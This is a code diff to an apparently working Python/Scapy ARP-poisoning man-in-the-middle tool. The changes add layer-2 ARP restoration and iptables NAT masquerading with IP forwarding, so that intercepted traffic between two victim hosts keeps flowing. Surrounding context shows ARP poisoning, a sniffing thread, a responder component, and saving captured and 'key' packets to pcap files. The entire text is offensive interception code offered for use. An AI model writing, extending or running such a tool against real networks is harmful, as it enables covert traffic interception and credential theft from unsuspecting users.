@@ -70,9 +70,12 @@ def poison_arp(victim_ip, victim_mac, spoof_ip, attacker_mac):
 
 
 def restore_arp(target_ip, target_mac, source_ip, source_mac):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                 psrc=source_ip, hwsrc=source_mac)
-    send(packet, count=4, verbose=False)
+    ether = Ether(dst=target_mac, src=source_mac)
+    arp = ARP(op=2, hwsrc=source_mac, psrc=source_ip,
+              hwdst=target_mac, pdst=target_ip)
+    packet = ether / arp
+    sendp(packet, iface=interface, count=5, inter=1, verbose=False)
+
 
 def enable_ip_forwarding():
     print("[*] Enabling IP forwarding")
@@ -81,6 +84,16 @@ def enable_ip_forwarding():
 def disable_ip_forwarding():
     print("[*] Disabling IP forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+def configure_routing(interface):
+    print("[*] Enabling IP forwarding and configuring NAT...")
+    os.system("sysctl -w net.ipv4.ip_forward=1")
+    os.system(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE")
+
+def disable_routing(interface):
+    print("[*] Disabling IP forwarding and cleaning up NAT...")
+    os.system("sysctl -w net.ipv4.ip_forward=0")
+    os.system(f"iptables -t nat -D POSTROUTING -o {interface} -j MASQUERADE || true")
 
 # -------- Sniffing & Protocol Detection --------
 def identify_protocol(packet):
@@ -164,6 +177,8 @@ def main():
     sniff_thread = threading.Thread(target=sniff_and_log, args=([host1_ip, host2_ip],), daemon=True)
     sniff_thread.start()
 
+    configure_routing(interface)
+
     print("[*] Beginning ARP poisoning. Press CTRL+C to stop.")
     try:
         attacker_mac = get_if_hwaddr(interface)
@@ -175,7 +190,7 @@ def main():
         print("\n[!] Cleaning up...")
         restore_arp(host1_ip, host1_mac, host2_ip, host2_mac)
         restore_arp(host2_ip, host2_mac, host1_ip, host1_mac)
-        disable_ip_forwarding()
+        disable_routing(interface)
         stop_responder()
         wrpcap(capture_file, packets)
         wrpcap(key_file, key_packets)
